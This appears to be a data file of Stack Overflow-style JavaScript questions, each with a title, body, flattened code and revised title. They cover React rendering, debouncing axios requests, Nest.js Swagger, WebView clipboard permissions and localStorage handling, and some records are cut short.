Does this iterate multiple times?," I have been discussing some code with colleagues: A suggestion was to filter this and use a forEach There was a discussion about iterating more than necessary. I've looked this up, and I can't find anything. I also tried to figure out how to view the optimized output, but I don't know how to do that either.I would expect that the filter and forEach turn into code that is very much like the for of with the continue, but I don't know how to be sure. How can I find out?

Jest formatting Intl.NumberFormat space character does not match," I'm running into an issue where Intl.NumberFormat is formatting the space character in some way that is different from what Jest is expecting. Tests against the same function with values that do not yield spaces as separators pass fine. Jest is considering the space between the 4 and the 5 characters to be different. I am using the intl polyfill for fr_CA both in my app and in my test.Here is my function, but the only really relevant part is the Intl.NumberFormat output. How can I reconcile the formatting for the space character so that my test passes?

And this will solve all your problems and make it lovely.Except, in the 3rd case your promise will error(), but might also error() in other cases (e.g. the API is down).So in reality the 3rd option boils down to: - In your promise.error check errorPayload.IsCancelled, which you have manually tracked in the cancellablePromise object, which has in turn been triggered by a manual call in ComponentWillUnmount.So all three are pretty much identical: When you are handling your promise outcomes, check the value of this variable that is directly tied to whether the component has already unmounted.Why do they assert that the 3rd option is better than the other 2, and that the 1st option is an antipattern. <code> ","Why is the cancelledPromise pattern considered better than the isMounted() ""antipattern"" in React?"

How to make a circular ScrollBox using JavaScript?," I want to recreate the circular scrollbox as depicted in the GIF below,I don't think there is some why if making a circular scrollbox using css is possible so I thought of adding padding-left to each child of the ul to make the scrollbox appear circular.To achieve this,add padding of 0px to li-1add padding of 2px to li-2add padding of 4px to li-3add padding of 6px to li-4add padding of 8px to li-5add padding of 6px to li-6add padding of 4px to li-7add padding of 2px to li-8add padding of 0px to li-9on scroll padding can be changed to add padding of 0px to li-2add padding of 2px to li-3add padding of 4px to li-4add padding of 6px to li-5add padding of 8px to li-6add padding of 6px to li-7add padding of 4px to li-8add padding of 2px to li-9add padding of 0px to li-10    and so on...Problem with my code is, when the scrollbox is scrolled via mouse scroll-wheel, it acts correctly but when the user uses the scroll-tab/scroll buttonsin the scrollbar, padding increases drastically.My code so far is: I am sure I'm over-complicating the problem with padding and stuff.

"My implementation of debounce axios request left the promise in pending state forever, is there a better way"," I need a simple debounce function with immediate always true.Without resorting to lodash and with the help of Can someone explain the ""debounce"" function in Javascript , I implemented it as following, It works as expected until I need to debounce axios request. Assumed I have a debounced axios method, I would like the calling method to be as usual, which means my debounced axios method should return promise I believe. The essence of original debounce implementation is to just run func once in a wait timeframe, but how do I just return one promise in a wait timeframe ?Then I came up with the following solution So the essence of my debounce_axios is to let the promise stay in pending state for the repeated request.Then the calling method debounced_axios().then(res => {...}).catch(err => {...}) does not need to change.The answer here Are JavaScript forever-pending promises bad? said ""There should be no side effect.""But I am still not 100% sure about letting a promise stay in pending forever. The other question is that Promise Anti patterns suggested not creating unnecessary promise. But in my case creating a new promise seems necessary.In a nutshell is there a simple to way to debounce axios request (or any request returns promise) ?  <code>  function debounce(func, wait) { var timeout; return function() { if (!timeout) func.apply(this, arguments); clearTimeout(timeout); timeout = setTimeout(()=>{timeout = null}, wait); };}; //the calling method should not change debounced_axios().then(res => {...}).catch(err => {...}) all_timers = {}function debounce_axios(input, wait) { return new Promise((resolve, reject) => { let timer = all_timers.[input] //check if it is a repeated request, pseudo code if (!timer) { axios(input).then(res=>{ resolve(res) }).catch(err => { reject(err) }) } clearTimeout(timer); timer = setTimeout(()=>{timer = null}, wait); all_timers[input] = timer };};","My implementation of debounce axios request left the promise in pending state forever, is there a better way?"

Mongo $lookup with multiple $match conditions," I have two mongo collections one containing contacts aka patients and the other containing notifications. I'm attempting to return results with all active contacts status: true in a given branchId / clinic_id and include their acknowledged: false notifications.

why is that the returned function from `useEffect` is called every time the component itself re-renders," I've been learning React and I read that the function returned from useEffect is meant to do cleanup and React performs the cleanup when the component unmounts.So I experimented with it a bit but found in the following example that the function was called every time the component re-renders as opposed to only the time it got unmounted from the DOM, i.e. it console.log(""unmount""); every time the component re-renders.Why is that?

Javascript - Bounding box of multiple overlapping rectangles," How can I get the bounding boxes of multiple overlapping rectangles? There might be multiple bounding boxes if there are rectangles that don't overlap.I have an array containing n objects representing the rectangles. Each object is representing a rectangle the following way: {left: 178, top: 67, width: 20, height: 14} They can be represented other ways as well like leftX, topY, rightX, bottomY; it can be converted easily.I'm not looking for non-max surpression algorithm. Is there a specific algorithm in literature that can achieve this? I'll try to convert it after in JavaScript.Edit: AuxTaco solution works as long as the rectangles are overlapping one after the other; if you draw the rectangles in the order specified like in the picture below you get 3 bounding areas.Edit2: Maybe an interesting case would be the following: Rectangle 1 and 2 overlap and their bounding box overlaps rectangle 3; however I'm not interested in this particular case and 3 could be treated as a separate rectangle. <code> ",Bounding box of multiple overlapping rectangles

Node JS: Image file download ends prematurely with no error," I am creating a application in Node.js to download image files. However, I have been having an issue where if my download speed is slow or I lose connection the image I am downloading will be truncated. This would not be so bad if my program threw an error warning me that the image did not finish downloading, however, it does not and resolves as if the image downloaded successfully. I do not receive an error when I check the response code or probe the image after downloading.This is the current code I am using to download images. I asked an earlier version of this question here but after implementing suggestions from the answer my downloader still has the same issues. The code for my downloader has also changed since then.How can I detect when an image has been truncated so I can instruct the downloader to reattempt the download it?Edit 1After reading this I think my issue might have something to do with the website I'm downloading from requiring me to use gzip and the client not being able to tell if the content has actually finished downloading when the server stops the response. However, I am not sure how to test for this happening.Edit 2This is what the response header looks like when my downloadedr successfully connects to an image. <code>  const fs = require('fs-extra');const request = require('request');var probe = require('probe-image-size');var progress = require('request-progress');var filename = 'C:/Users/User/Desktop/myimage.jpg';var req = request(createRequestHeaders('www.linktomyimage.com/image.jpg'));downloadImage(req, filename)function createRequestHeaders(url) { var cookie = `userid=${userid}; phash=${phash};`; return { 'url': url, 'method': 'GET', 'gzip': true, 'headers': { 'Referer': `https://${website}/`, 'Cookie': cookie } };}function downloadImage(req, filename) { return new Promise((resolve, reject) => { var response = null; var bytes; var dirname = path.dirname(filename); if (!fs.existsSync(dirname)) fs.ensureDirSync(dirname); progress(req, { delay: 0 }).on('progress', function (state) { updateDownloadSpeed(state.speed); }).on('end', function () { if (response.statusCode == 200) { var input = require('fs').createReadStream(filename); probe(input).then(result => { input.destroy(); if (result != null) { resolve({bytes: bytes, width: result.width, height: result.height,}); } else { // The image size probe does not detect if the download was truncated reject({ 'name': 'ImageMissingOrCorrupt'); } }).catch((error) => { reject(error); }); } else { // This is never triggered when the download stops and the image is truncated reject({ 'name': 'StatusCodeError', 'message': response.statusCode }); } }).on('response', function (resp) { response = resp; bytes = response.headers['content-length']; }).on('error', function (error) { // This does not detect when an image is truncated either reject(error); }).pipe(fs.createWriteStream(filename)); });} cache-control:""public, max-age=31536000""connection:""close""content-disposition:""inline; filename=129.jpg""content-length:""185756""content-transfer-encoding:""binary""content-type:""image/jpeg""date:""Thu, 05 Sep 2019 00:15:11 GMT""expires:""Fri, 04 Sep 2020 00:15:11 GMT""server:""Apache""",Node JS/Gzip: Image file download ends prematurely with no error

Running package binaries in javascript monorepo," I'm trying to figure out correct approach for a javascript monorepo. Imagine monorepo containing packages / libraries: Now let's say both lib-a and lib-b packages use webpack as their build tool.I see two approachesAdd wepback as dependency to root. Include ""build"" script in both packages: ""build"": ""webpack -p --config webpack.config.js. webpack.config.js could include root webpack.config.js. Then I could use tool like lerna to run the build from root directory (which means webpack binary is recognized. However I will be unable to run the build in specific packages since webpack is not available there. I could probably change the build script to something like ""build"": ""../../node_modules/.bin/webpack -p --config webpack.config.jsAlways include webpack in each package. This means that build script will succeed. This also means that each package will have the same dependency and I should probably watch that each package uses same webpack version.Basically what I'm getting at is how should packages inside monorepo be structured? If any package is published, should it always be possible to build that package separately. <code>  root - node_modules - packages + lib-a * node_modules + lib-b * node_modules",What is a correct approach to a javascript monorepo

When does React re-renders after a setState call made inside an event handler," From React DOCS:https://reactjs.org/docs/state-and-lifecycle.htmlState Updates May Be AsynchronousReact may batch multiple setState() calls into a single update for performance.This makes total sense. If you have something like the function below, it would be very inefficient to re-render on every setState call So, in the situation above, I expect React to batch all 3 setState calls into a single re-render. And it does exactly that!But what I want to know is:Once handleClick has completed, is a re-render guaranteed to happen immediatelly handleClick has done running? I mean literally immediately, like synchronously immediately?From this snippet that I've build, it seems that this is true. React will synchronously apply the updates (re-render) after handleClick has completed. Correct me if I'm wrong in assuming that.See snippet below:Click 3 times as fast as you canhandleClick will call a setState and will log the current props.counterThere is an expensive loop on App, so it will take a long time to re-renderYou'll be able to click much faster than React can re-render the whole AppBut you'll see the props.counter is different every time, without any repetition, even if you click multiple times really fastIt means that once your 2nd click is processed (it will take a while because of the expensive loop), React has already re-rendered the whole thing and the handleClick function has already been recreated with the new value for props.counter that came from the counter updated state.Try clicking 5 times really fast and you'll see that the behavior is the same.QUESTIONWhen setState calls are made inside an event handler function, once that handler function has completed running, is it guaranteed that a re-render will occur immediately (synchronously) after that completion of the handler?  <code>  const [state1,setState1] = useState(false);const [state2,setState2] = useState(false);const [state3,setState3] = useState(false);function handleClick() { setState1(true); setState2(true); setState3(true);} function App() { console.log(""App rendering...""); const [counter, setCounter] = React.useState(0); // AN EXPENSIVE LOOP TO SLOW DOWN THE RENDER OF 'App' for (let i = 0; i < 100000; ) { for (let j = 0; j < 10000; j++) {} i = i + 1; } return <Child counter={counter} setCounter={setCounter} />;}function Child(props) { console.log(""Child rendering...""); // THIS FUNCTION WILL CALL 'setState' // AND WILL ALSO LOG THE CURRENT 'props.counter' function handleClick() { props.setCounter(prevState => prevState + 1); console.log(props.counter); } return ( <React.Fragment> <div>Counter: {props.counter}</div> <button onClick={handleClick}>Click</button> </React.Fragment> );}const rootElement = document.getElementById(""root"");ReactDOM.render(<App />, rootElement); <script src=""https://cdnjs.cloudflare.com/ajax/libs/react/16.8.3/umd/react.production.min.js""></script><script src=""https://cdnjs.cloudflare.com/ajax/libs/react-dom/16.8.3/umd/react-dom.production.min.js""></script><div id=""root""/>",When does React re-render after a setState call made inside an event handler
"(Why) should I *always* use components in any vues.js app, however simple?"," I am just getting started with vue.js, and already created most of the very small functionality I need from just the first getting started chapters of the documentation. Now I want to add some tests to ensure my functionality always works after changes (normally I do TDD but this time I had to learn vue first and decide if i keep using it).So looking for documentation I basically see that just about every documentation/howto on vue testing is about testing components. I really found none else.This leads me to the question as stated in the subject:Is it a necessary practice to use vue components, even for the most simple application, when I have definitely nothing that i want to reuse as a component?Besides the current case of only finding documentation on how to test a componentized vue app, will I run in other problems?I searched the web and the vue docs(at least there I'd hope for a sentence of explanation if and why I should always use components in the ""essentials/Components basics"" chapter, but dont find it...), and here, but I couldn't find a clue if and why it might be a generally bad idea not to use components.Based on the questions I see in comments, it seems necessary to explain why I even ask such a question:I don't criticize components in general or say they are a bad idea - I see that basically abstraction and separation of concerns is often helpful, even important in many cases.At the same time, for any kind of abstraction, layering, and separation, there is a line below which introducing it brings more overhead in terms of additional files, glue code to put things together, and tools needed to use it (in the case of vue components special editors capable of properly displaying and syntax highlighting .vue files) than advantages.The vue documentation itself starts without components, which in my understanding suggests that not all users should use components in any case.It seemed to me that I am pretty close to this line, and I was looking for advice and reasons if I should consider my app being above the line so I should introduce components, or I can assume I am below. Answers I thought of would be like ""even though you might not benefit a lot from components, and will have to add 3 more files to your 3 files app, doubling the number, it's highly recommend to use them, because nearly all documentation, and most tooling for vue assumes components being used."" - or ""Just go ahead, introduce components when you think it fits"". I got a helpful answer in the meantime that I marked as such. <code> ","(Why) should I *always* use components in any vue.js app, however simple?"

Why setting the element display property to flex in CSS changes the behaviour of JS onclick event with 'event.target'?," I have a basic list going on, with the HTML structure like this: Then I use some JS to add buttons to delete items, so the end structure is like this: I also have a function to strike through the list elements on click by toggling a CSS class: This works as expected (e.g. the list item is struck through). However, if I change the list items' display property to flex in CSS: And then click on the item, the text of the button also is struck through, unlike before! Since I've started writing this, I no longer know which behaviour feels more 'wrong' to me, lol.The full code is on Codepen here. Try clicking the items in the list, then uncomment the CSS style for .item to see what I mean.My uneducated guess would be that the answer to this is in the way the flex containers treat the items in them. However, my understanding of it is very limited, so I've come to you for an answer. <code>  <ul class=""list"">{...} <li class=""item"">Ellipse</li>{...} <ul class=""list"">{...} <li class=""item"">Ellipse <button>Delete item</button></li>{...} let ul = document.querySelector('.list');{...}function markAsDone (event) { let target = event.target; target.classList.toggle('done');}{...}ul.addEventListener('click', markAsDone); .item { display: flex; justify-content: space-between; max-width: 300px ;}",Why does setting the element display property to flex in CSS change the behaviour of the JS onclick event with 'event.target'?

Nest.js swagger - types in dto are not visible in swagger," I'm setting up swagger document in my small Nest.js app according to this documentation: https://docs.nestjs.com/recipes/swaggerHow do I setup dto to correctly show schema in swagger?

Here is what I mean:dto: swagger: expected result in swagger example value: This is the function: What I tried:When I replaced type for exact params in dto, it shows it properly in swagger.I did cross-check of dto against interface, where I added wrong field into 'isOnline' and it finds it and marks it, that it isnt good.Schema is displayed in swagger, but also only top level, not the typed part. So its not just example value.Checked Stack Overflow; found two related threads, but neither one solved it. One suggested to manually create sub-dtos instead of types. Well... I better not do that.I'm doing something wrong, or missed something in documentation. Or maybe parser of that swagger module is unable to extract type/interface when generating json. <code>  export class HealthCheckDataDto { serverStatus: {} // dont have it typed yet; dbStatus: MongoConnectionStateT;} [ { ""serverStatus"": {}, ""dbStatus"": {} }] [ { ""serverStatus"": {}, ""dbStatus"": { ""isOnline"": true, ""msg"": ""string"" } }] @ApiResponse({ status: 200, description: 'blabla', type: [HealthCheckDataDto] })@ApiResponse({ status: 500, description: 'blabla, but bad', type: [HealthCheckDataDto] })@Get('/api/healthcheck')healthCheckApp(@Res() res: Response<HealthCheckDataDto>) { // check HCs and setup status code const healthCheck: HealthCheckI = this.healthcheckService.getFullHealthCheck(); const statusCode = (healthCheck.dbStatus.isOnline) ?

Android Webview - Clipboard API Call Throws NotAllowedError Without Invoking onPermissionRequest()," I have a simple page with a button, that when pressed, uses the Async Clipboard API to write to the clipboard. This works on both Chrome and Firefox, desktop and mobile.

I still get the same error:NotAllowError: Write permission denied.Also Logcat logged nothing.I suspected maybe my Android App requires additional permissions to access the clipboard, but according to https://developer.android.com/about/versions/10/privacy/changes#clipboard-data, my App should have permission when it has focus.

HREF Behaviour - need clarity," I have code like this on the profile page of my website. This is done using EJS. They are basically href tags that have the URL string of the users social pages. The backend is a MongoDBQuestion - If I enter a valid URL in the respective field in the database, I am getting redirected to the correct URL. However if the string is empty, its posting a GET request to /profile/:username. Is this the way href tags normally behave? If yes, what is the way to circumvent.

Angular - RxJS : fromEvent and Async pipe," I tried to do the following in my component which uses changeDetection: ChangeDetectionStrategy.OnPush, And in the template It doesn't work, however if I remove the OnPush, it does.

So I don't get why I haven't got the same behavior with the fromEvent <code>  @ViewChild('searchInput') input: ElementRef;ngAfterViewInit() { this.searchText$ = fromEvent<any>(this.input.nativeElement, 'keyup') .pipe( map(event => event.target.value), startWith(''), debounceTime(300), distinctUntilChanged() );} <div *ngIf=""searchText$ | async as searchText;""> results for ""<b>{{searchText}}</b>""</div> this.searchText$ = interval(1000);",Angular - RxJS : afterViewInit and Async pipe

Dealing with IOS not caching audio," I have a language site that I am working on to teach language. Users can click on objects and hear the audio for what they click on. Many of the people that will be using this are in more remote areas with slower Internet connections. Because of this, I am needing to cache audio before each of the activities is loaded otherwise there is too much of a delay.Previously, I was having an issue where preloading would not work because iOS devices do not allow audio to load without a click event. I have gotten around this, however, I now have another issue. iOS/Safari only allows the most recent audio file to be loaded. Therefore, whenever the user clicks on another audio file (even if it was clicked on previously), it is not cached and the browser has to download it again.So far I have not found an adequate solution to this. There are many posts from around 2011~2012 that try to deal with this but I have not found a good solution. One solution was to combine all audio clips for activity into a single audio file. That way only one audio file would be loaded into memory for each activity and then you just pick a particular part of the audio file to play. While this may work, it also becomes a nuisance whenever an audio clip needs to be changed, added, or removed.I need something that works well in a ReactJS/Redux environment and caches properly on iOS devices.Is there a 2020 solution that works well? <code> ",Dealing with IOS web browsers not caching audio

determining image file size of a react Meterial-ui CardMedia," Good evening,I'm using a material-ui Card inside a React functional component, with a CardMedia such as : I'm trying to determine the image file size in bytes.

I looked into Mozilla doc, Image only has width and height properties. Since the image is already loaded, I should have a way to determine its size in byte without using XMLHttpRequest ? <code>  <CardMedia className={classes.media} image={props.image} title={props.cardTitle}/> function checkImage() { var img = new Image(); img.addEventListener(""load"", function(){ console.log( this.naturalWidth +' '+ this.naturalHeight ); }); img.src = props.image;}",determining image file size of a react Material-ui CardMedia

Does useCallback has a semantic guarantee?," The React documentation says the following about useMemoYou may rely on useMemo as a performance optimization, not as asemantic guarantee. In the future, React may choose to forget somepreviously memoized values and recalculate them on next render, e.g.to free memory for offscreen components. Write your code so that itstill works without useMemo and then add it to optimize performance.For useCallback there is the following line:useCallback(fn, deps) is equivalent to useMemo(() => fn, deps).The word ""equivalent"" is a bit fuzzy for me and I don't know if that also means that useCallback does not provide a semantic guarantee. <code> ",Does useCallback have a semantic guarantee?

Regex to match words in any order (using input value)," I'm using Isotope.js with vanilla javascript.Inside my items, I have put a div with a display:none to hide keywords for each item. For example, the item Orange has the keywords 'color' and 'fruit'. So if someone types in any of those three words into the input form (orange, color, or fruit) that item will be shown via Isotope.Here is a jsfiddle showing my project.What I'm wanting to do, is if someone were to type all three words into the input form in any order the item will show. Right now the item will only show if the keywords are typed in order. For example, typing in ""fruit color"" will show the item Orange, but ""color fruit"" will not.Edit: This answer here does exactly what I'm trying to achieve. I applied it to a jQuery version of my project and worked perfectly. However, I'm having troubling rewriting it in vanilla JS. Any help is immensely appreciated. <code> ",Match words in any order in Isotope (using input value)

How can I delete a specific value (or item) within localSorage key?," I have a localStorage key (f7Contacts) stored as a JSON array, as it should be. I know how to delete the whole key using localStorage.removeItem(""myKey"");.My array, as you can see is formed by a set of JSON arrays embeeded inside of it. There is the wider one named f7Contacts and inside of it there are some subarrays (to name them someway) named visitings and consultas. Now, what I'm trying to delete is not a single item from any of the JSON arrays nor the whole f7Contacts array but the JSON sub array named consultas.I have tried so many ways but I could not get a working code.This is what I've got until now:My stringify array looks like this:(now I have up dated the string to make it more alike my real case because the proposed answers manage to delete the consultas just in one of the contacts, and in a case it deletes the consultas from the first contact and deletes the rest of the contacts. I named ELISA and FRANK for you to differetiate them. Also updated my Javascript and html as a mixture from my own code and the one of 's answer. I did this to keep my enviroment consistent. This code manage to delete the consultas of the first contact but also deletes the rest of the contacts.):JAVASCRIPT HTML I must let it clear that this localStorage key (f7Contacts) is really stored by another js within the app and if I have included the localStorage.setItem(""f7Contacts"", JSON.stringify(contacts)); at the beginning of my code above is just as an attempt to make it clear for you. And let clear too that there are several contacts within the string and the task is to delete consultas for them all. <code>  document.addEventListener(""DOMContentLoaded"", function() { var contacts = [{ id: ""95470e9e-ee5c-4467-9500-1fcbeae1b57c"", hasPic: true, picId: 3, createdOn: ""2021-08-01T17:31:32.230Z"", firstName: ""ELISA"", company: ""La Fbrica"", job: ""Barrendero"", mobile: ""+53555555"", phone: ""+5372222222"", sms: """", email: ""fulano@nauta.cu"", madedate: ""Invalid date"", clinic: ""2"", gender: ""M"", birthday: ""Invalid date"", age: ""47"", visitings: [{ id: ""1"", vdate: ""19/07/-2006 12:00 AM"", pdcb: ""Est officia dolorem "", vdiagnose: ""Laborum Ea consecte"", vrecom: ""Mollit cillum sed pe"", nextv: ""Invalid date"" }], consultas: [{ id: ""1"", ldate: ""04/07/-1978 12:00 AM"", lmotive: ""Soluta cumque aspern"", ldiagnose: ""Quidem autem do ut o"", ttest: ""Rerum sint atque il"", etest: ""Officiis deserunt un"", mtest: ""Nihil a dolore rem s"", nextv: ""Invalid date"" }, { id: ""2"", ldate: ""04/04/-1991 12:00 AM"", lmotive: ""Eius in est enim no"", ldiagnose: ""In aliqua Sunt dol"", ttest: ""Sunt dolor eu sed N"", etest: ""Quia aut reprehender"", mtest: ""Unde libero autem an"", nextv: ""Invalid date"" } ], isFavorite: true }, {id: ""95470e9e-ee5c-4467-9500-1fcbeae1b57c"", hasPic: true, picId: 3, createdOn: ""2021-08-01T17:31:32.230Z"", firstName: ""FRANK"", company: ""La Fbrica"", job: ""Barrendero"", mobile: ""+53555555"", phone: ""+5372222222"", sms: """", email: ""fulano@nauta.cu"", madedate: ""Invalid date"", clinic: ""2"", gender: ""M"", birthday: ""Invalid date"", age: ""47"", visitings: [{ id: ""1"", vdate: ""19/07/-2006 12:00 AM"", pdcb: ""Est officia dolorem "", vdiagnose: ""Laborum Ea consecte"", vrecom: ""Mollit cillum sed pe"", nextv: ""Invalid date"" }], consultas: [{ id: ""1"", ldate: ""04/07/-1978 12:00 AM"", lmotive: ""Soluta cumque aspern"", ldiagnose: ""Quidem autem do ut o"", ttest: ""Rerum sint atque il"", etest: ""Officiis deserunt un"", mtest: ""Nihil a dolore rem s"", nextv: ""Invalid date"" }, { id: ""2"", ldate: ""04/04/-1991 12:00 AM"", lmotive: ""Eius in est enim no"", ldiagnose: ""In aliqua Sunt dol"", ttest: ""Sunt dolor eu sed N"", etest: ""Quia aut reprehender"", mtest: ""Unde libero autem an"", nextv: ""Invalid date"" } ], isFavorite: true }]; // Get from lS const lS = JSON.parse(localStorage.getItem('f7Contacts')); // DOM elements const cancelBtn = document.getElementById('dntdelete'); const deleteBtn = document.getElementById('delete'); const consultas = document.getElementById('consultas'); const json = document.getElementById('json'); function clearConsults(){ document.getElementById('confirm').style.display=""block""; { function removeItem() { const lS = JSON.parse(localStorage.getItem('f7Contacts')); if (!lS) return; const obj = lS[0]; // Find 'consultas' key in the object const findKey = Object.keys(obj).find(key => key.includes('consultas')); if (findKey) { // Delete key from the object with array delete obj[findKey]; } // Back wraping the obj into array & put to the localStorage localStorage.setItem('f7Contacts', JSON.stringify([obj])); //set item back into storage } alert('CONSULTAS ELIMINADAS'); document.getElementById('confirm').style.display=""none""; if (lS[0].consultas) { consultas.textContent = lS[0].consultas.length; } consultas.textContent = 0; json.textContent = JSON.stringify(obj, undefined, 2); } cancelBtn.addEventListener('click', dntdelete); deleteBtn.addEventListener('click', clearConsults); } }); document.getElementById('dntdelete').onclick = function(){ alert('OPERACIN CANCELADA'); document.getElementById('confirm').style.display=""none""; return false; }; <main><div class=""results""><h4>Consultas<span id=""consultas""></span></h4></div><div class=""control-buttons""><div id=""confirm"" style=""display: none""><button id=""delete"">Delete</button><button id=""dntdelete"">Cancel</button></div><a onclick=""clearConsults()"">Delete Consultas</a><h3>SURE YOU WANT TO DELETE?</h3></div></main> ",How can I delete a specific JSON array (consultas) embedded within another JSON array (f7Contacts) both saved in a single localSorage key?

How does toString() only return a primitive values but ignores objects?," The MDN documentation on Object.prototype.toString says that when toString gets overriden, it should only return a primitive value:The toString() function you create must return a primitive, otherwise it will be ignored.However, in the following example we return an object inside of toString and it returns the object normally: Output: So the toString method returns the object normally. What is up with the misinformation? <code>  const ob2 = { val1: 100, val2: 200, toString: function() { return { veh: ""meh"" }; // Object. } };console.log(ob2.toString()); { veh: ""meh"" }",What does it mean that `toString` gets ignored if it returns a non-primitive?
